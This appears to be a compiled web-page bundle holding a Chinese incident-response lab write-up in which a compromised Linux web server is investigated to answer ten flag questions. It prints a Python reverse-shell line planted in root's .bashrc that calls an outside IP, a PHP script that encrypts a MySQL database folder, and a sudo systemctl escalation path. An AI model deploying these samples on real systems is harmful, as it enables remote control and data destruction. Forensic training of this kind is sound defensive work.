"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[7635],{135:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>l,contentTitle:()=>u,default:()=>i,frontMatter:()=>d,metadata:()=>t,toc:()=>o});const t=JSON.parse('{"id":"\u5e94\u6025\u54cd\u5e94\u9776\u673a/\u7384\u673a/\u7b2c\u4e5d\u7ae0 blueteam\u7684\u5c0f\u5fc3\u601d","title":"\u7b2c\u4e5d\u7ae0 blueteam\u7684\u5c0f\u5fc3\u601d","description":"1","source":"@site/docs/\u5e94\u6025\u54cd\u5e94\u9776\u673a/\u7384\u673a/\u7b2c\u4e5d\u7ae0 blueteam\u7684\u5c0f\u5fc3\u601d.md","sourceDirName":"\u5e94\u6025\u54cd\u5e94\u9776\u673a/\u7384\u673a","slug":"/\u5e94\u6025\u54cd\u5e94\u9776\u673a/\u7384\u673a/\u7b2c\u4e5d\u7ae0 blueteam\u7684\u5c0f\u5fc3\u601d","permalink":"/docs/\u5e94\u6025\u54cd\u5e94\u9776\u673a/\u7384\u673a/\u7b2c\u4e5d\u7ae0 blueteam\u7684\u5c0f\u5fc3\u601d","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/\u5e94\u6025\u54cd\u5e94\u9776\u673a/\u7384\u673a/\u7b2c\u4e5d\u7ae0 blueteam\u7684\u5c0f\u5fc3\u601d.md","tags":[],"version":"current","frontMatter":{},"sidebar":"YingJiSidebar","previous":{"title":"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-Linux\u65e5\u5fd7\u5206\u6790","permalink":"/docs/\u5e94\u6025\u54cd\u5e94\u9776\u673a/\u7384\u673a/\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-Linux\u65e5\u5fd7\u5206\u6790"},"next":{"title":"\u7b2c\u4e8c\u7ae0\u65e5\u5fd7\u5206\u6790-apache\u65e5\u5fd7\u5206\u6790","permalink":"/docs/\u5e94\u6025\u54cd\u5e94\u9776\u673a/\u7384\u673a/\u7b2c\u4e8c\u7ae0\u65e5\u5fd7\u5206\u6790-apache\u65e5\u5fd7\u5206\u6790"}}');var s=r(4848),a=r(8453);const d={},u=void 0,l={},o=[{value:"1",id:"1",level:2},{value:"2",id:"2",level:2},{value:"3",id:"3",level:2},{value:"4",id:"4",level:2},{value:"5",id:"5",level:2},{value:"6",id:"6",level:2},{value:"7",id:"7",level:2},{value:"8",id:"8",level:2},{value:"9",id:"9",level:2},{value:"10",id:"10",level:2}];function c(e){const n={a:"a",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h2,{id:"1",children:"1"}),"\n",(0,s.jsx)(n.p,{children:"\u653b\u51fb\u8005\u901a\u8fc7\u4ec0\u4e48\u5bc6\u7801\u6210\u529f\u767b\u5f55\u4e86\u7f51\u7ad9\u7684\u540e\u53f0\uff1f\u63d0\u4ea4\u5bc6\u7801\u5b57\u7b26\u4e32\u7684\u5c0f\u5199md5\u503c\uff0c"}),"\n",(0,s.jsx)(n.p,{children:"\u6839\u76ee\u5f55\u6709\u4e00\u4e2a\u6d41\u91cf\u5305"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241208215647959.png",alt:"image-20241208215647959"})}),"\n",(0,s.jsxs)(n.p,{children:["302\u8df3\u8f6c\u6210\u529f\u767b\u5f55\uff0c\u5bc6\u7801\u5c31\u662f",(0,s.jsx)(n.code,{children:"Aa12345^"})]}),"\n",(0,s.jsx)(n.h2,{id:"2",children:"2"}),"\n",(0,s.jsx)(n.p,{children:'\u653b\u51fb\u8005\u5728\u54ea\u4e2aPHP\u9875\u9762\u4e2d\u6210\u529f\u4e0a\u4f20\u4e86\u540e\u95e8\u6587\u4ef6\uff1f\u4f8b\u5982upload.php\u9875\u9762\uff0c\u4e0a\u4f20\u5b57\u7b26\u4e32"upload.php"\u7684\u5c0f\u5199md5\u503c\uff0c'}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241208215802448.png",alt:"image-20241208215802448"})}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"pluginmgr.php"}),"\u6587\u4ef6"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"flag{b05c0be368ffa72e6cb2df7e1e1b27be}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"3",children:"3"}),"\n",(0,s.jsx)(n.p,{children:"\u627e\u5230\u653b\u51fb\u8005\u4e0a\u4f20\u7684webshell\u6587\u4ef6\uff0c\u63d0\u4ea4\u8be5\u6587\u4ef6\u7684\u5c0f\u5199md5\u503c\uff0c"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241208220451678.png",alt:"image-20241208220451678"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root@ubuntu18:/var/www# md5sum /var/www/html/plugins/cpg.php\r\na097b773ced57bb7d51c6719fe8fe5f5  /var/www/html/plugins/cpg.php\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"flag{a097b773ced57bb7d51c6719fe8fe5f5}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"4",children:"4"}),"\n",(0,s.jsx)(n.p,{children:"\u653b\u51fb\u8005\u540e\u7eed\u53c8\u4e0b\u8f7d\u4e86\u4e00\u4e2a\u53ef\u6267\u884c\u7684\u540e\u95e8\u7a0b\u5e8f\uff0c\u63d0\u4ea4\u8be5\u6587\u4ef6\u7684\u5c0f\u5199md5\u503c\uff0c"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241208220608217.png",alt:"image-20241208220608217"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root@ubuntu18:/var/www/html/plugins# cd '.       '\r\nroot@ubuntu18:/var/www/html/plugins/.       # ls -lh\r\ntotal 4.0K\r\n-rwxrwxrwx 1 www-data www-data 250 Nov 11 13:41 is.world\r\nroot@ubuntu18:/var/www/html/plugins/.       # md5sum is.world\r\nee279c39bf3dcb225093bdbafeb9a439  is.world\n"})}),"\n",(0,s.jsx)(n.h2,{id:"5",children:"5"}),"\n",(0,s.jsx)(n.p,{children:'\u653b\u51fb\u8005\u521b\u5efa\u4e86\u540e\u95e8\u7528\u6237\u7684\u540d\u79f0\u662f\uff1f\u4f8b\u5982attack\u6076\u610f\u7528\u6237\uff0c\u4e0a\u4f20\u5b57\u7b26\u4e32"attack"\u7684\u5c0f\u5199md5\u503c\uff0c'}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root@ubuntu18:/var/log# grep -n -H -a -i \"useradd\" ./auth.log \r\n./auth.log:1:Oct  8 03:05:55 ubuntu18 useradd[1053]: new group: name=ubuntu18, GID=1000\r\n./auth.log:2:Oct  8 03:05:55 ubuntu18 useradd[1053]: new user: name=ubuntu18, UID=1000, GID=1000, home=/home/ubuntu18, shell=/bin/bash\r\n./auth.log:3:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to group 'adm'\r\n./auth.log:4:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to group 'cdrom'\r\n./auth.log:5:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to group 'sudo'\r\n./auth.log:6:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to group 'dip'\r\n./auth.log:7:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to group 'plugdev'\r\n./auth.log:8:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to group 'lxd'\r\n./auth.log:9:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to shadow group 'adm'\r\n./auth.log:10:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to shadow group 'cdrom'\r\n./auth.log:11:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to shadow group 'sudo'\r\n./auth.log:12:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to shadow group 'dip'\r\n./auth.log:13:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to shadow group 'plugdev'\r\n./auth.log:14:Oct  8 03:05:55 ubuntu18 useradd[1053]: add 'ubuntu18' to shadow group 'lxd'\r\n./auth.log:135:Apr 18 03:23:01 ubuntu18 useradd[1632]: new user: name=mysql, UID=111, GID=116, home=/nonexistent, shell=/bin/false\r\n./auth.log:182:Nov 18 23:24:19 ubuntu18 useradd[4196]: new user: name=knowledgegraphd, UID=0, GID=0, home=/home/knowledgegraphd, shell=/bin/bash\r\n./auth.log:183:Nov 18 23:24:19 ubuntu18 useradd[4196]: add 'knowledgegraphd' to group 'root'\r\n./auth.log:184:Nov 18 23:24:19 ubuntu18 useradd[4196]: add 'knowledgegraphd' to shadow group 'root'\n"})}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"knowledgegraphd"}),"\u7528\u6237\u52a0\u5165root\u7ec4\uff0c\u53ef\u7591\u7528\u6237"]}),"\n",(0,s.jsx)(n.p,{children:"\u6216\u8005\u67e5\u770bpasswd\u6587\u4ef6\uff0c\u89c2\u5bdfuid\u4e3a0\u7684\u7528\u6237"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"cat /etc/passwd | awk -F: '$3==0{print $1}'\n"})}),"\n",(0,s.jsx)(n.h2,{id:"6",children:"6"}),"\n",(0,s.jsx)(n.p,{children:"\u653b\u51fb\u8005\u521b\u5efa\u4e86\u4e00\u4e2a\u6301\u4e45\u5316\u7684\u914d\u7f6e\u9879\uff0c\u5bfc\u81f4\u4efb\u610f\u7528\u6237\u767b\u5f55\u5c31\u4f1a\u89e6\u53d1\u540e\u95e8\u7684\u8fde\u63a5\u3002\u63d0\u4ea4\u8be5\u914d\u7f6e\u9879\u5bf9\u5e94\u914d\u7f6e\u6587\u4ef6\u7684\u5c0f\u5199md5\u503c\uff0c"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"/etc/profile"})," \u662fLinux\u7cfb\u7edf\u4e2d\u4e00\u4e2a\u91cd\u8981\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5b83\u5c5e\u4e8e\u7cfb\u7edf\u7684\u5168\u5c40\u73af\u5883\u914d\u7f6e\u6587\u4ef6\u3002\u8fd9\u4e2a\u6587\u4ef6\u5728\u6bcf\u6b21\u7528\u6237\u767b\u5f55\u65f6\u88ab\u6267\u884c\uff0c\u7528\u4e8e\u914d\u7f6e\u7cfb\u7edf\u7684\u5168\u5c40\u73af\u5883\u53d8\u91cf\u548c\u542f\u52a8\u811a\u672c\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'root@ubuntu18:/etc/init.d# cat /etc/profile\r\n\r\n/var/www/html/plugins/".       "/is.world &\r\n\r\nroot@ubuntu18:/var/lib/mysql# md5sum /etc/profile\r\n65bf3e4a9ac90d75ec28be0317775618  /etc/profile\n'})}),"\n",(0,s.jsx)(n.h2,{id:"7",children:"7"}),"\n",(0,s.jsx)(n.p,{children:"\u653b\u51fb\u8005\u521b\u5efa\u4e86\u4e00\u4e2a\u6301\u4e45\u5316\u7684\u914d\u7f6e\u9879\uff0c\u5bfc\u81f4\u53ea\u6709root\u7528\u6237\u767b\u5f55\u624d\u4f1a\u89e6\u53d1\u540e\u95e8\u7684\u8fde\u63a5\u3002\u63d0\u4ea4\u8be5\u914d\u7f6e\u9879\u5bf9\u5e94\u914d\u7f6e\u6587\u4ef6\u7684\u5c0f\u5199md5\u503c\uff0c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'root@ubuntu18:/root# cat .bashrc\r\npython -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("124.221.70.199",9919));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' &\r\nroot@ubuntu18:/root# md5sum .bashrc\r\n4acc9c465eeeb139c194893ec0a8bcbc  .bashrc=\n'})}),"\n",(0,s.jsx)(n.h2,{id:"8",children:"8"}),"\n",(0,s.jsx)(n.p,{children:'\u653b\u51fb\u8005\u52a0\u5bc6\u4e86\u54ea\u4e2a\u6570\u636e\u5e93\uff1f\u63d0\u4ea4\u6570\u636e\u5e93\u7684\u6587\u4ef6\u5939\u540d\uff0c\u4f8b\u5982user\u6570\u636e\u5e93\u5bf9\u5e94\u5b58\u653e\u4f4d\u7f6e\u4e3auser\u6587\u4ef6\u5939\uff0c\u4e0a\u4f20\u5b57\u7b26\u4e32"user"\u7684\u5c0f\u5199md5\u503c\uff0c'}),"\n",(0,s.jsx)(n.p,{children:"\u67e5\u770b/var/lib/mysql\u6587\u4ef6\u5939\uff0c\u53d1\u73b0 clockup.php \u6587\u4ef6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:'<?php\r\n$currentDate = date("Y-m-d");\r\n$key = md5($currentDate);\r\n$iv = substr(hash(\'sha256\', "DeepMountainsGD"), 0, 16);\r\n$filePath = "/var/lib/mysql/JPMorgan@0020Chase";\r\n$files = scandir($filePath);\r\nforeach ($files as $file) {\r\n    if ($file != "." && $file != "..") {\r\n        $fullPath = $filePath . \'/\' . $file;\r\n        $content = file_get_contents($fullPath);\r\n        $encryptedContent = openssl_encrypt($content, \'aes-256-cbc\', $key, 0, $iv);\r\n        file_put_contents($fullPath, $encryptedContent);\r\n    }\r\n}\r\n?>\n'})}),"\n",(0,s.jsx)(n.p,{children:"JPMorgan@0020Chase\u6587\u4ef6\u5939\u88ab\u52a0\u5bc6"}),"\n",(0,s.jsx)(n.h2,{id:"9",children:"9"}),"\n",(0,s.jsx)(n.p,{children:"\u89e3\u5bc6\u6570\u636e\u5e93\uff0c\u63d0\u4ea4Harper\u7528\u6237\u5bf9\u5e94Areer\u7684\u503c\u3002\u63d0\u4ea4Areer\u503c\u7684\u5c0f\u5199md5\u503c\uff0c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root@ubuntu18:/var/lib/mysql/JPMorgan@0020Chase# php -r 'echo date(\"Y-m-d\");'\r\n2024-04-30\r\nroot@ubuntu18:/var/lib/mysql/JPMorgan@0020Chase# php -r 'echo md5(date(\"Y-m-d\"));'\r\n1342d69a84b3aa4ae4f9c7c359417e80\r\nroot@ubuntu18:/var/lib/mysql/JPMorgan@0020Chase# php -r 'echo substr(hash('sha256', \"DeepMountainsGD\"), 0, 16);'\r\nc8203eb05fa13ebf\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u89e3\u5bc6\u811a\u672c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:'<?php\r\n$currentDate = date("Y-m-d");\r\n$key = md5(\'2023-11-18\');\r\n$iv = substr(hash(\'sha256\', "DeepMountainsGD"), 0, 16);\r\n$filePath = "JPMorgan@0020Chase";\r\n$files = scandir($filePath);\r\nforeach ($files as $file) {\r\n    if ($file != "." && $file != "..") {\r\n        $fullPath = $filePath . \'/\' . $file;\r\n        $content = file_get_contents($fullPath);\r\n        $decryptedContent = openssl_decrypt($content, \'aes-256-cbc\', $key, 0, $iv);\r\n        file_put_contents($fullPath, $decryptedContent);\r\n    }\r\n}\r\n?>\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u6210\u529f\u89e3\u5bc6\u6570\u636e\u5e93\u4e4b\u540e\uff0c\u627e\u5230\u6570\u636e\u5e93\u7684\u5bc6\u7801"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:"$CONFIG['dbtype'] =\t  'pdo:mysql';\t\t\t// Your database type\r\n$CONFIG['dbserver'] =\t  'localhost';\t\t\t// Your database server\r\n$CONFIG['dbuser'] =\t  'root';\t\t\t// Your database username\r\n$CONFIG['dbpass'] =\t  'mysql123';\t\t\t// Your database password\r\n$CONFIG['dbname'] =\t  'mirage';\t\t\t// Your database name\r\n\r\n// DATABASE TABLE NAMES PREFIX\r\n$CONFIG['TABLE_PREFIX'] =\t\t   'cpg16x_';\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"mysql> SELECT * FROM UserIdentity WHERE User = 'Harper';\r\n+------+--------+-------+\r\n| No   | User   | Areer |\r\n+------+--------+-------+\r\n| 14   | Harper | Chef  |\r\n+------+--------+-------+\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"Chef\n"})}),"\n",(0,s.jsx)(n.h2,{id:"10",children:"10"}),"\n",(0,s.jsx)(n.p,{children:"\u56e0\u4e3a\u4ec0\u4e48\u6587\u4ef6\u4e2d\u7684\u6f0f\u6d1e\u914d\u7f6e\uff0c\u5bfc\u81f4\u4e86\u653b\u51fb\u8005\u6210\u529f\u6267\u884c\u547d\u4ee4\u5e76\u63d0\u6743\u3002\u63d0\u4ea4\u8be5\u6587\u4ef6\u7684\u5c0f\u5199md5\u503c\uff0c"}),"\n",(0,s.jsx)(n.p,{children:"sudoers\u6587\u4ef6\u914d\u7f6e\u9519\u8bef"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root    ALL=(ALL:ALL) ALL\r\nwww-data ALL=(root) NOPASSWD: /bin/systemctl status apache2.service\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root@ubuntu18:/root# md5sum /etc/sudoers\r\n6585817513b0ea96707ebb0d04d6aeff  /etc/sudoers\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u63d0\u6743\u65b9\u6cd5"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"https://gtfobins.github.io/gtfobins/systemctl/#sudo",children:"https://gtfobins.github.io/gtfobins/systemctl/#sudo"})})]})}function i(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(c,{...e})}):c(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>d,x:()=>u});var t=r(6540);const s={},a=t.createContext(s);function d(e){const n=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function u(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:d(e.components),t.createElement(a.Provider,{value:n},e.children)}}}]);